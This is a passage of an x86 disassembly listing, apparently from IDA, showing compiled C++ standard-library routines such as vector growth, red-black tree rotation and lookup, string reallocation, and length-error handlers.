                mov     [ebp+var_10], esp
                mov     eax, [ebp+arg_0]
                mov     esi, ecx
                mov     [ebp+var_60], eax
                mov     eax, [esi+0Ch]
                mov     [ebp+var_58], esi
                test    eax, eax
                jnz     short loc_40A074
                xor     ebx, ebx
                jmp     short loc_40A08C
; ---------------------------------------------------------------------------

loc_40A074:                             ; CODE XREF: sub_40A030+3E↑j
                mov     ecx, [esi+14h]
                sub     ecx, eax
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     ebx, edx
                shr     ebx, 1Fh
                add     ebx, edx

loc_40A08C:                             ; CODE XREF: sub_40A030+42↑j
                mov     edi, [esi+10h]
                mov     ecx, edi
                sub     ecx, [esi+0Ch]
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                mov     ecx, 9249249h
                sub     ecx, eax
                cmp     ecx, 1
                jnb     short loc_40A0B8
                call    sub_40A3B0
; ---------------------------------------------------------------------------

loc_40A0B8:                             ; CODE XREF: sub_40A030+81↑j
                inc     eax
                cmp     ebx, eax
                jnb     loc_40A25F
                mov     ecx, ebx
                shr     ecx, 1
                mov     edx, 9249249h
                sub     edx, ecx
                cmp     edx, ebx
                jnb     short loc_40A0D4
                xor     ebx, ebx
                jmp     short loc_40A0D6
; ---------------------------------------------------------------------------

loc_40A0D4:                             ; CODE XREF: sub_40A030+9E↑j
                add     ebx, ecx

loc_40A0D6:                             ; CODE XREF: sub_40A030+A2↑j
                cmp     ebx, eax
                jnb     short loc_40A0DC
                mov     ebx, eax

loc_40A0DC:                             ; CODE XREF: sub_40A030+A8↑j
                mov     ecx, ebx
                call    sub_409FA0
                mov     edi, [ebp+arg_8]
                sub     edi, [esi+0Ch]
                mov     ecx, eax
                mov     eax, 92492493h
                imul    edi
                add     edx, edi
                sar     edx, 4
                mov     edi, edx
                xor     eax, eax
                mov     [ebp+var_4], eax
                shr     edi, 1Fh
                add     edi, edx
                mov     [ebp+var_5C], eax
                lea     eax, ds:0[edi*8]
                mov     [ebp+var_54], ecx
                sub     eax, edi
                lea     eax, [ecx+eax*4]
                mov     byte ptr [ebp+var_50], 0
                mov     ecx, [ebp+var_50]
                mov     edx, [ebp+var_50]
                push    ecx
                mov     ecx, [ebp+var_60]
                push    edx
                push    ecx
                push    eax
                mov     ecx, 1
                mov     [ebp+var_58], edi
                call    sub_40B0E0
                mov     ecx, [esi+0Ch]
                add     esp, 10h
                mov     byte ptr [ebp+var_50], 0
                mov     edx, [ebp+var_50]
                mov     eax, [ebp+var_50]
                push    edx
                mov     edx, [ebp+arg_8]
                push    eax
                push    edx
                mov     edx, [ebp+var_54]
                mov     [ebp+var_5C], 1
                call    sub_40B6B0
                mov     edx, [ebp+var_54]
                mov     eax, [esi+10h]
                inc     edi
                lea     ecx, ds:0[edi*8]
                sub     ecx, edi
                lea     edx, [edx+ecx*4]
                add     esp, 0Ch
                mov     byte ptr [ebp+var_50], 0
                mov     ecx, [ebp+var_50]
                push    ecx
                mov     ecx, [ebp+var_50]
                push    ecx
                mov     ecx, [ebp+arg_8]
                push    eax
                mov     [ebp+var_5C], 2
                call    sub_40B6B0
                mov     ecx, [esi+0Ch]
                mov     edi, [esi+10h]
                sub     edi, ecx
                mov     eax, 92492493h
                imul    edi
                add     edx, edi
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     esp, 0Ch
                lea     edx, [edx+eax+1]
                mov     [ebp+var_50], edx
                test    ecx, ecx
                jz      short loc_40A1D1
                mov     edx, [ebp+var_50]
                mov     edi, [esi+10h]
                push    edx
                mov     eax, ecx
                call    sub_40B200
                mov     eax, [esi+0Ch]
                add     esp, 4
                push    eax
                call    sub_40F15B
                mov     edx, [ebp+var_50]
                add     esp, 4

loc_40A1D1:                             ; CODE XREF: sub_40A030+17F↑j
                mov     eax, [ebp+var_54]
                lea     ecx, ds:0[ebx*8]
                sub     ecx, ebx
                lea     ecx, [eax+ecx*4]
                mov     [esi+14h], ecx
                lea     ecx, ds:0[edx*8]
                sub     ecx, edx
                lea     edx, [eax+ecx*4]
                mov     [esi+10h], edx
                mov     [esi+0Ch], eax
                jmp     loc_40A383
; ---------------------------------------------------------------------------

loc_40A1FA:                             ; DATA XREF: .rdata:stru_423C3C↓o
                cmp     [ebp+var_5C], 1
                mov     esi, [ebp+var_58]
                mov     ebx, [ebp+var_54]
                jle     short loc_40A220
                mov     eax, [ebp+var_50]
                lea     ecx, ds:0[esi*8]
                sub     ecx, esi
                push    eax
                lea     edi, [ebx+ecx*4]
                mov     eax, ebx
                call    sub_40B200
                add     esp, 4

loc_40A220:                             ; CODE XREF: sub_40A030+1D4↑j
                cmp     [ebp+var_5C], 0
                jle     short loc_40A24D
                mov     edx, [ebp+var_50]
                lea     eax, [esi+1]
                push    edx
                lea     ecx, ds:0[eax*8]
                sub     ecx, eax
                lea     edx, ds:0[esi*8]
                sub     edx, esi
                lea     edi, [ebx+ecx*4]
                lea     eax, [ebx+edx*4]
                call    sub_40B200
                add     esp, 4

loc_40A24D:                             ; CODE XREF: sub_40A030+1F4↑j
                push    ebx
                call    sub_40F15B
                add     esp, 4
                push    0
                push    0
                call    sub_41032B

loc_40A25F:                             ; CODE XREF: sub_40A030+8B↑j
                sub     edi, [ebp+arg_8]
                mov     eax, 92492493h
                imul    edi
                add     edx, edi
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                cmp     eax, 1
                jnb     loc_40A32F
                mov     ecx, [ebp+var_60]
                push    ecx
                lea     ecx, [ebp+var_30]
                call    sub_4085A0
                mov     ebx, 2
                mov     [ebp+var_4], ebx
                mov     eax, [esi+10h]
                mov     ecx, [ebp+arg_8]
                mov     byte ptr [ebp+var_50], 0
                mov     edi, [ebp+var_50]
                push    edi
                mov     edi, [ebp+var_50]
                push    edi
                lea     edx, [ecx+1Ch]
                push    eax
                call    sub_40B6B0
                mov     byte ptr [ebp+var_4], 3
                mov     edi, [esi+10h]
                mov     ecx, edi
                sub     ecx, [ebp+arg_8]
                mov     eax, 92492493h
                imul    ecx
                add     edx, ecx
                sar     edx, 4
                mov     eax, edx
                shr     eax, 1Fh
                add     eax, edx
                add     esp, 0Ch
                mov     byte ptr [ebp+var_50], 0
                mov     edx, [ebp+var_50]
                push    edx
                mov     ecx, 1
                sub     ecx, eax
                mov     eax, [ebp+var_50]
                push    eax
                lea     edx, [ebp+var_30]
                push    edx
                push    edi
                call    sub_40B0E0
                mov     [ebp+var_4], ebx
                add     dword ptr [esi+10h], 1Ch
                mov     esi, [esi+10h]
                mov     eax, [ebp+arg_8]
                add     esp, 10h
                lea     edi, [esi-1Ch]
                lea     ebx, [ebp+var_30]
                call    sub_40AFC0
                mov     ecx, ebx
                jmp     short loc_40A37E
; ---------------------------------------------------------------------------

loc_40A30B:                             ; DATA XREF: .rdata:stru_423C4C↓o
                mov     eax, [ebp+var_50]
                mov     ecx, [ebp+var_58]
                mov     edi, [ecx+10h]
                push    eax
                mov     eax, [ebp+arg_8]
                add     edi, 1Ch
                add     eax, 1Ch
                call    sub_40B200
                add     esp, 4
                push    0
                push    0
                call    sub_41032B

loc_40A32F:                             ; CODE XREF: sub_40A030+248↑j
                mov     edx, [ebp+var_60]
                push    edx
                lea     ecx, [ebp+var_4C]
                call    sub_4085A0
                mov     [ebp+var_4], 5
                mov     edi, [esi+10h]
                mov     byte ptr [ebp+var_50], 0
                mov     eax, [ebp+var_50]
                mov     ecx, [ebp+var_50]
                push    eax
                push    ecx
                lea     ebx, [edi-1Ch]
                push    edi
                mov     edx, edi
                mov     ecx, ebx
                call    sub_40B6B0
                mov     [esi+10h], eax
                mov     eax, ebx
                mov     ebx, [ebp+arg_8]
                add     esp, 0Ch
                call    sub_40AFE0
                mov     eax, [ebp+arg_8]
                lea     edi, [eax+1Ch]
                lea     ebx, [ebp+var_4C]
                call    sub_40AFC0
                mov     ecx, ebx

loc_40A37E:                             ; CODE XREF: sub_40A030+2D9↑j
                call    sub_4085D0

loc_40A383:                             ; CODE XREF: sub_40A030+1C5↑j
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     ecx, [ebp+var_14]
                xor     ecx, ebp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_40A030      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn

sub_40A3B0      proc near               ; CODE XREF: sub_408740+7E↑p
                                        ; sub_409180+9↑p ...

var_50          = byte ptr -50h
var_4C          = byte ptr -4Ch
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_C           = byte ptr -0Ch
var_4           = dword ptr -4

                push    0FFFFFFFFh
                push    offset SEH_40A3B0
                mov     eax, large fs:0
                push    eax
                sub     esp, 44h
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+54h+var_C]
                mov     large fs:0, eax
                push    12h
                push    offset aVectorTTooLong ; "vector<T> too long"
                lea     ecx, [esp+5Ch+var_50]
                mov     [esp+5Ch+var_38], 0Fh
                mov     [esp+5Ch+var_3C], 0
                mov     [esp+5Ch+var_4C], 0
                call    sub_409840
                lea     eax, [esp+54h+var_50]
                push    eax
                lea     ecx, [esp+58h+var_34]
                mov     [esp+58h+var_4], 0
                call    sub_4010D0
                push    offset unk_423344
                lea     ecx, [esp+58h+var_34]
                push    ecx
                mov     [esp+5Ch+var_34], offset off_420278
                call    sub_41032B
sub_40A3B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40A430      proc near               ; CODE XREF: sub_409580+1B↑p

var_8           = byte ptr -8
arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch
arg_C           = dword ptr  10h
arg_10          = dword ptr  14h

                sub     esp, 8
                push    ebx
                push    ebp
                mov     ebp, [esp+10h+arg_0]
                push    esi
                mov     esi, eax
                mov     eax, [esi+18h]
                mov     ecx, [esi]
                push    edi
                mov     edi, [eax]
                mov     eax, [esp+18h+arg_4]
                test    eax, eax
                jz      short loc_40A450
                cmp     eax, ecx
                jz      short loc_40A459

loc_40A450:                             ; CODE XREF: sub_40A430+1A↑j
                call    sub_40EC7A
                mov     eax, [esp+18h+arg_4]

loc_40A459:                             ; CODE XREF: sub_40A430+1E↑j
                mov     ecx, [esp+18h+arg_8]
                cmp     ecx, edi
                jnz     short loc_40A4C4
                mov     ebx, [esp+18h+arg_C]
                mov     edi, [esi+18h]
                mov     edx, [esi]
                test    ebx, ebx
                jz      short loc_40A472
                cmp     ebx, edx
                jz      short loc_40A47F

loc_40A472:                             ; CODE XREF: sub_40A430+3C↑j
                call    sub_40EC7A
                mov     ecx, [esp+18h+arg_8]
                mov     eax, [esp+18h+arg_4]

loc_40A47F:                             ; CODE XREF: sub_40A430+40↑j
                cmp     [esp+18h+arg_10], edi
                jnz     short loc_40A4C4
                mov     ecx, [esi+18h]
                mov     edx, [ecx+4]
                push    edx
                mov     ecx, esi
                call    sub_409270
                mov     eax, [esi+18h]
                mov     [eax+4], eax
                mov     eax, [esi+18h]
                mov     dword ptr [esi+1Ch], 0
                mov     [eax], eax
                mov     eax, [esi+18h]
                mov     [eax+8], eax
                mov     eax, [esi+18h]
                mov     ecx, [eax]
                mov     edx, [esi]
                mov     [ebp+0], edx
                mov     eax, ebp
                mov     [ebp+4], ecx
                pop     edi
                pop     esi
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    14h
; ---------------------------------------------------------------------------

loc_40A4C4:                             ; CODE XREF: sub_40A430+2F↑j
                                        ; sub_40A430+53↑j ...
                test    eax, eax
                jz      short loc_40A4CE
                cmp     eax, [esp+18h+arg_C]
                jz      short loc_40A4DB

loc_40A4CE:                             ; CODE XREF: sub_40A430+96↑j
                call    sub_40EC7A
                mov     ecx, [esp+18h+arg_8]
                mov     eax, [esp+18h+arg_4]

loc_40A4DB:                             ; CODE XREF: sub_40A430+9C↑j
                cmp     ecx, [esp+18h+arg_10]
                jz      loc_40A562
                mov     edi, eax
                mov     ebx, ecx
                test    eax, eax
                jnz     short loc_40A4F6
                call    sub_40EC7A
                mov     ecx, [esp+18h+arg_8]

loc_40A4F6:                             ; CODE XREF: sub_40A430+BB↑j
                cmp     byte ptr [ecx+45h], 0
                jz      short loc_40A503
                call    sub_40EC7A
                jmp     short loc_40A548
; ---------------------------------------------------------------------------

loc_40A503:                             ; CODE XREF: sub_40A430+CA↑j
                mov     eax, [ecx+8]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40A526
                mov     ecx, eax
                mov     eax, [ecx]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40A520

loc_40A516:                             ; CODE XREF: sub_40A430+EE↓j
                mov     ecx, eax
                mov     eax, [ecx]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40A516

loc_40A520:                             ; CODE XREF: sub_40A430+E4↑j
                mov     [esp+18h+arg_8], ecx
                jmp     short loc_40A548
; ---------------------------------------------------------------------------

loc_40A526:                             ; CODE XREF: sub_40A430+DA↑j
                mov     eax, [ecx+4]
                cmp     byte ptr [eax+45h], 0
                jnz     short loc_40A544
                nop

loc_40A530:                             ; CODE XREF: sub_40A430+112↓j
                cmp     ecx, [eax+8]
                jnz     short loc_40A544
                mov     ecx, eax
                mov     [esp+18h+arg_8], ecx
                mov     eax, [eax+4]
                cmp     byte ptr [eax+45h], 0
                jz      short loc_40A530

loc_40A544:                             ; CODE XREF: sub_40A430+FD↑j
                                        ; sub_40A430+103↑j
                mov     [esp+18h+arg_8], eax

loc_40A548:                             ; CODE XREF: sub_40A430+D1↑j
                                        ; sub_40A430+F4↑j
                push    ebx
                push    edi
                lea     eax, [esp+20h+var_8]
                push    eax
                push    esi
                call    sub_40AA20
                mov     ecx, [esp+18h+arg_8]
                mov     eax, [esp+18h+arg_4]
                jmp     loc_40A4C4
; ---------------------------------------------------------------------------

loc_40A562:                             ; CODE XREF: sub_40A430+AF↑j
                mov     esi, [esi]
                pop     edi
                mov     [ebp+0], esi
                pop     esi
                mov     eax, ebp
                mov     [ebp+4], ecx
                pop     ebp
                pop     ebx
                add     esp, 8
                retn    14h
sub_40A430      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40A580      proc near               ; CODE XREF: sub_407940+1DF↑p
                                        ; sub_408AC0+E↑p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                sub     esp, 10h
                mov     eax, [eax+18h]
                push    ebx
                mov     ebx, [eax+4]
                cmp     byte ptr [ebx+45h], 0
                mov     [esp+14h+var_C], eax
                jnz     loc_40A682
                mov     eax, [ecx+14h]
                mov     edx, [ecx+18h]
                push    ebp
                push    esi
                add     ecx, 4
                push    edi
                mov     [esp+20h+var_10], eax
                mov     [esp+20h+var_4], edx
                mov     [esp+20h+var_8], ecx
                jmp     short loc_40A5B6
; ---------------------------------------------------------------------------

loc_40A5B2:                             ; CODE XREF: sub_40A580+F5↓j
                mov     ecx, [esp+20h+var_8]

loc_40A5B6:                             ; CODE XREF: sub_40A580+30↑j
                mov     edi, 10h
                cmp     [esp+20h+var_4], edi
                jb      short loc_40A5C5
                mov     edx, [ecx]
                jmp     short loc_40A5C7
; ---------------------------------------------------------------------------

loc_40A5C5:                             ; CODE XREF: sub_40A580+3F↑j
                mov     edx, ecx

loc_40A5C7:                             ; CODE XREF: sub_40A580+43↑j
                mov     ebp, [ebx+20h]
                mov     ecx, ebp
                cmp     ecx, ebp
                jnb     short $+2

loc_40A5D0:                             ; CODE XREF: sub_40A580+4E↑j
                mov     esi, ebp
                cmp     ebp, eax
                jb      short loc_40A5D8
                mov     esi, eax

loc_40A5D8:                             ; CODE XREF: sub_40A580+54↑j
                cmp     [ebx+24h], edi
                jb      short loc_40A5E2
                mov     edi, [ebx+10h]
                jmp     short loc_40A5E5
; ---------------------------------------------------------------------------

loc_40A5E2:                             ; CODE XREF: sub_40A580+5B↑j
                lea     edi, [ebx+10h]

loc_40A5E5:                             ; CODE XREF: sub_40A580+60↑j
                cmp     esi, 4
                jb      short loc_40A604
                lea     ebx, [ebx+0]

loc_40A5F0:                             ; CODE XREF: sub_40A580+82↓j
                mov     ecx, [edi]
                cmp     ecx, [edx]
                jnz     short loc_40A608
                sub     esi, 4
                add     edx, 4
                add     edi, 4
                cmp     esi, 4
                jnb     short loc_40A5F0

loc_40A604:                             ; CODE XREF: sub_40A580+68↑j
                test    esi, esi
                jz      short loc_40A653

loc_40A608:                             ; CODE XREF: sub_40A580+74↑j
                movzx   ecx, byte ptr [edi]
                movzx   eax, byte ptr [edx]
                sub     ecx, eax
                jnz     short loc_40A643
                cmp     esi, 1
                jbe     short loc_40A64F
                movzx   ecx, byte ptr [edi+1]
                movzx   eax, byte ptr [edx+1]
                sub     ecx, eax
                jnz     short loc_40A643
                cmp     esi, 2
                jbe     short loc_40A64F
                movzx   ecx, byte ptr [edi+2]
                movzx   eax, byte ptr [edx+2]
                sub     ecx, eax
                jnz     short loc_40A643
                cmp     esi, 3
                jbe     short loc_40A64F
                movzx   ecx, byte ptr [edi+3]
                movzx   edx, byte ptr [edx+3]
                sub     ecx, edx

loc_40A643:                             ; CODE XREF: sub_40A580+90↑j
                                        ; sub_40A580+A1↑j ...
                mov     eax, [esp+20h+var_10]
                sar     ecx, 1Fh
                or      ecx, 1
                jmp     short loc_40A655
; ---------------------------------------------------------------------------

loc_40A64F:                             ; CODE XREF: sub_40A580+95↑j
                                        ; sub_40A580+A6↑j ...
                mov     eax, [esp+20h+var_10]

loc_40A653:                             ; CODE XREF: sub_40A580+86↑j
                xor     ecx, ecx

loc_40A655:                             ; CODE XREF: sub_40A580+CD↑j
                test    ecx, ecx
                jnz     short loc_40A664
                cmp     ebp, eax
                jb      short loc_40A666
                cmp     ebp, eax
                setnz   cl
                test    ecx, ecx

loc_40A664:                             ; CODE XREF: sub_40A580+D7↑j
                jge     short loc_40A66B

loc_40A666:                             ; CODE XREF: sub_40A580+DB↑j
                mov     ebx, [ebx+8]
                jmp     short loc_40A671
; ---------------------------------------------------------------------------

loc_40A66B:                             ; CODE XREF: sub_40A580:loc_40A664↑j
                mov     [esp+20h+var_C], ebx
                mov     ebx, [ebx]

loc_40A671:                             ; CODE XREF: sub_40A580+E9↑j
                cmp     byte ptr [ebx+45h], 0
                jz      loc_40A5B2
                mov     eax, [esp+20h+var_C]
                pop     edi
                pop     esi
                pop     ebp

loc_40A682:                             ; CODE XREF: sub_40A580+12↑j
                pop     ebx
                add     esp, 10h
                retn
sub_40A580      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40A690      proc near               ; CODE XREF: sub_40AA20+1C5↓p
                                        ; sub_40AA20+216↓p ...

arg_0           = dword ptr  4

                mov     eax, [ecx+8]
                mov     edx, [eax]
                mov     [ecx+8], edx
                mov     edx, [eax]
                cmp     byte ptr [edx+45h], 0
                jnz     short loc_40A6A3
                mov     [edx+4], ecx

loc_40A6A3:                             ; CODE XREF: sub_40A690+E↑j
                mov     edx, [ecx+4]
                mov     [eax+4], edx
                mov     edx, [esp+arg_0]
                mov     edx, [edx+18h]
                cmp     ecx, [edx+4]
                jnz     short loc_40A6C0
                mov     [edx+4], eax
                mov     [eax], ecx
                mov     [ecx+4], eax
                retn    4
; ---------------------------------------------------------------------------

loc_40A6C0:                             ; CODE XREF: sub_40A690+23↑j
                mov     edx, [ecx+4]
                cmp     ecx, [edx]
                jnz     short loc_40A6D1
                mov     [edx], eax
                mov     [eax], ecx
                mov     [ecx+4], eax
                retn    4
; ---------------------------------------------------------------------------

loc_40A6D1:                             ; CODE XREF: sub_40A690+35↑j
                mov     [edx+8], eax
                mov     [eax], ecx
                mov     [ecx+4], eax
                retn    4
sub_40A690      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40A6E0      proc near               ; CODE XREF: sub_40AA20+1F8↓p
                                        ; sub_40AA20+22D↓p ...

arg_0           = dword ptr  4

                mov     eax, [ecx]
                mov     edx, [eax+8]
                mov     [ecx], edx
                mov     edx, [eax+8]
                cmp     byte ptr [edx+45h], 0
                jnz     short loc_40A6F3
                mov     [edx+4], ecx

loc_40A6F3:                             ; CODE XREF: sub_40A6E0+E↑j
                mov     edx, [ecx+4]
                mov     [eax+4], edx
                mov     edx, [esp+arg_0]
                mov     edx, [edx+18h]
                cmp     ecx, [edx+4]
                jnz     short loc_40A711
                mov     [edx+4], eax
                mov     [eax+8], ecx
                mov     [ecx+4], eax
                retn    4
; ---------------------------------------------------------------------------

loc_40A711:                             ; CODE XREF: sub_40A6E0+23↑j
                mov     edx, [ecx+4]
                cmp     ecx, [edx+8]
                jnz     short loc_40A725
                mov     [edx+8], eax
                mov     [eax+8], ecx
                mov     [ecx+4], eax
                retn    4
; ---------------------------------------------------------------------------

loc_40A725:                             ; CODE XREF: sub_40A6E0+37↑j
                mov     [edx], eax
                mov     [eax+8], ecx
                mov     [ecx+4], eax
                retn    4
sub_40A6E0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40A730      proc near               ; CODE XREF: sub_4092F0+8C↑p

var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40A730
                mov     eax, large fs:0
                push    eax
                sub     esp, 8
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                push    48h
                call    sub_40F94F
                mov     esi, eax
                add     esp, 4
                mov     [ebp+var_14], esi
                mov     [ebp+var_4], 1
                test    esi, esi
                jz      short loc_40A79A
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+arg_4]
                mov     edx, [ebp+arg_8]
                mov     edi, [ebp+arg_C]
                mov     [esi], eax
                lea     eax, [esi+0Ch]
                push    eax
                mov     [esi+4], ecx
                mov     [esi+8], edx
                call    sub_40AEF0
                mov     byte ptr [esi+44h], 0
                mov     byte ptr [esi+45h], 0

loc_40A79A:                             ; CODE XREF: sub_40A730+43↑j
                mov     eax, esi
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    10h
; ---------------------------------------------------------------------------

loc_40A7B0:                             ; DATA XREF: .rdata:stru_423500↓o
                mov     ecx, [ebp+var_14]
                push    ecx
                call    sub_40F15B
                add     esp, 4
                push    0
                push    0
                call    sub_41032B
sub_40A730      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40A7D0      proc near               ; CODE XREF: sub_408C10+2D↑p
                                        ; sub_408CA0+62↑p ...

var_28          = dword ptr -28h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                push    ebp
                mov     ebp, esp
                push    0FFFFFFFFh
                push    offset SEH_40A7D0
                mov     eax, large fs:0
                push    eax
                sub     esp, 1Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ___security_cookie
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_C]
                mov     large fs:0, eax
                mov     [ebp+var_10], esp
                mov     edi, ecx
                mov     [ebp+var_14], edi
                mov     eax, [ebp+arg_0]
                mov     esi, eax
                or      esi, 0Fh
                cmp     esi, 0FFFFFFFEh
                jbe     short loc_40A811
                mov     esi, eax
                jmp     short loc_40A833
; ---------------------------------------------------------------------------

loc_40A811:                             ; CODE XREF: sub_40A7D0+3B↑j
                mov     ebx, [edi+18h]
                mov     eax, 0AAAAAAABh
                mul     esi
                mov     ecx, ebx
                shr     ecx, 1
                shr     edx, 1
                cmp     edx, ecx
                jnb     short loc_40A833
                mov     eax, 0FFFFFFFEh
                sub     eax, ecx
                cmp     ebx, eax
                ja      short loc_40A833
                lea     esi, [ecx+ebx]

loc_40A833:                             ; CODE XREF: sub_40A7D0+3F↑j
                                        ; sub_40A7D0+53↑j ...
                xor     ebx, ebx
                lea     ecx, [esi+1]
                mov     [ebp+var_4], ebx
                cmp     ecx, ebx
                ja      short loc_40A84F
                xor     ecx, ecx

loc_40A841:                             ; CODE XREF: sub_40A7D0+89↓j
                push    ecx
                call    sub_40F94F
                add     esp, 4
                mov     [ebp+arg_0], eax
                jmp     short loc_40A8A5
; ---------------------------------------------------------------------------

loc_40A84F:                             ; CODE XREF: sub_40A7D0+6D↑j
                or      eax, 0FFFFFFFFh
                xor     edx, edx
                div     ecx
                cmp     eax, 1
                jnb     short loc_40A841
                lea     ecx, [ebp+var_18]
                push    ecx
                lea     ecx, [ebp+var_28]
                mov     [ebp+var_18], ebx
                call    sub_40E649
                push    offset unk_42337C
                lea     edx, [ebp+var_28]
                push    edx
                mov     [ebp+var_28], offset off_420260
                call    sub_41032B

loc_40A87F:                             ; DATA XREF: .rdata:stru_4233DC↓o
                mov     eax, [ebp+arg_0]
                mov     ecx, [ebp+var_14]
                mov     [ebp+var_1C], eax
                inc     eax
                mov     [ebp+var_10], esp
                push    eax
                mov     byte ptr [ebp+var_4], 2
                call    sub_40AE00
                mov     [ebp+arg_0], eax
                mov     eax, offset loc_40A89F
                retn
; ---------------------------------------------------------------------------

loc_40A89F:                             ; CODE XREF: sub_40A7D0+CE↑j
                                        ; DATA XREF: sub_40A7D0+C9↑o
                mov     edi, [ebp+var_14]
                mov     esi, [ebp+var_1C]

loc_40A8A5:                             ; CODE XREF: sub_40A7D0+7D↑j
                mov     ebx, [ebp+arg_4]
                test    ebx, ebx
                jbe     short loc_40A8CC
                cmp     dword ptr [edi+18h], 10h
                jb      short loc_40A8B7
                mov     eax, [edi+4]
                jmp     short loc_40A8BA
; ---------------------------------------------------------------------------

loc_40A8B7:                             ; CODE XREF: sub_40A7D0+E0↑j
                lea     eax, [edi+4]

loc_40A8BA:                             ; CODE XREF: sub_40A7D0+E5↑j
                mov     ecx, [ebp+arg_0]
                push    ebx
                push    eax
                lea     eax, [esi+1]
                push    eax
                push    ecx
                call    sub_40F166
                add     esp, 10h

loc_40A8CC:                             ; CODE XREF: sub_40A7D0+DA↑j
                cmp     dword ptr [edi+18h], 10h
                jb      short loc_40A8DE
                mov     edx, [edi+4]
                push    edx
                call    sub_40F15B
                add     esp, 4

loc_40A8DE:                             ; CODE XREF: sub_40A7D0+100↑j
                mov     ecx, [ebp+arg_0]
                lea     eax, [edi+4]
                mov     byte ptr [eax], 0
                mov     [eax], ecx
                mov     [edi+18h], esi
                mov     [edi+14h], ebx
                cmp     esi, 10h
                jb      short loc_40A8F6
                mov     eax, ecx

loc_40A8F6:                             ; CODE XREF: sub_40A7D0+122↑j
                mov     byte ptr [eax+ebx], 0
                mov     ecx, [ebp+var_C]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_40A90E:                             ; DATA XREF: .rdata:stru_4233CC↓o
                mov     esi, [ebp+var_14]
                cmp     dword ptr [esi+18h], 10h
                jb      short loc_40A923
                mov     eax, [esi+4]
                push    eax
                call    sub_40F15B
                add     esp, 4

loc_40A923:                             ; CODE XREF: sub_40A7D0+145↑j
                push    0
                mov     dword ptr [esi+18h], 0Fh
                mov     dword ptr [esi+14h], 0
                push    0
                mov     byte ptr [esi+4], 0
                call    sub_41032B
sub_40A7D0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame fuzzy-sp

sub_40A940      proc near               ; CODE XREF: sub_409E20+21↑p

var_54          = byte ptr -54h
var_50          = byte ptr -50h
var_40          = dword ptr -40h
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_C           = byte ptr -0Ch
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                push    0FFFFFFFFh
                push    offset SEH_40A940
                mov     eax, large fs:0
                push    eax
                sub     esp, 4Ch
                mov     eax, ___security_cookie
                xor     eax, esp
                push    eax
                lea     eax, [esp+5Ch+var_C]
                mov     large fs:0, eax
                push    11h
                push    offset aDequeTTooLong ; "deque<T> too long"
                lea     ecx, [esp+64h+var_54]
                mov     [esp+64h+var_3C], 0Fh
                mov     [esp+64h+var_40], 0
                mov     [esp+64h+var_50], 0
                call    sub_409840
                lea     eax, [esp+5Ch+var_54]
                push    eax
                lea     ecx, [esp+60h+var_38]
                mov     [esp+60h+var_4], 0
                call    sub_4010D0
                push    offset unk_423344
                lea     ecx, [esp+60h+var_38]
                push    ecx
                mov     [esp+64h+var_38], offset off_420278
                call    sub_41032B
sub_40A940      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40A9C0      proc near               ; CODE XREF: sub_409E20+54↑p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch

                sub     esp, 10h
                test    ecx, ecx
                ja      short loc_40A9DD
                xor     ecx, ecx

loc_40A9C9:                             ; CODE XREF: sub_40A9C0+27↓j
                lea     edx, ds:0[ecx*4]
                push    edx
                call    sub_40F94F
